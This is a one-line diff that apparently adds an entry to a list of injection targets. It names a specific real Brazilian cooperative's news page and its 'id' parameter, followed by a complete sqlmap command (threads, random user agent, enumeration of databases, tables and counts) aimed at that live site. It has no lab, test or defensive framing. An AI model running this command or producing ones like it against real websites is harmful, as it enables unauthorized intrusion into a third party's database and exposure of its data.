@@ -1,0 +1,1 @@
+https://www.coopcana.com.br/noticia-detalhe.php?id=6 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.coopcana.com.br/noticia-detalhe.php?id=6 --dbs --tables --count
